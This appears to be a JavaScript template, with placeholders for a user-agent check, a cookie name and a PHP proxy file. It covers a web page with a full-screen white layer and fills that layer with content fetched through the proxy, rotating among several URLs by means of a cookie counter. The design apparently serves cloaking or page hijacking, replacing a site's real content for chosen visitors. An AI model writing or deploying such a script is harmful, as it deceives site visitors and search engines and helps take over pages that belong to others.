function str_chk() {
    [USER_AGENT_CHECK]
}
function setCookie (name, value, expires, path, domain, secure) {
      document.cookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
}
function getCookie(name) {
	var cookie = " " + document.cookie;
	var search = " " + name + "=";
	var setStr = null;
	var offset = 0;
	var end = 0;
	if (cookie.length > 0) {
		offset = cookie.indexOf(search);
		if (offset != -1) {
			offset += search.length;
			end = cookie.indexOf(";", offset)
			if (end == -1) {
				end = cookie.length;
			}
			setStr = unescape(cookie.substring(offset, end));
		}
	}
	return(setStr);
}
function show(urls) {
    if (document == undefined && document.body == undefined) {
        return
    }
    var cookie = "[NAME_COOKIE]";
    var data = getCookie(cookie);
    var url = urls[0];
    if(urls.length>0)
      {
      if(data>=0) data++;
      else data=0;
       //---
      if(data > (urls.length-1)) data = 0;
       url = urls[data];
       setCookie(cookie,data,'','');
      }

    window.clearInterval(interval);
    var div = document.createElement("DIV");
    with (div) {
        setAttribute("id", "content");
        setAttribute("style", "width: 100%; background-color: #FFF; height: 7000px; position: absolute; top: 0; left: 0;")
    }
    document.body.appendChild(div);
    load("[PHP-FILE]?url=" + encodeURIComponent(url))
}
function load(a) {
    var b = getXmlHttp();
    b.onreadystatechange = function () {
        if (b.readyState == 4) {
            document.getElementById("content").innerHTML = b.responseText
        }
    };
    b.open("GET", a, true);
    b.send(null)
}
function getXmlHttp() {
    var a;
    try {
        a = new ActiveXObject("Msxml2.XMLHTTP")
    } catch (c) {
        try {
            a = new ActiveXObject("Microsoft.XMLHTTP")
        } catch (b) {
            a = false
        }
    }
    if (!a && typeof XMLHttpRequest != "undefined") {
        a = new XMLHttpRequest()
    }
    return a
};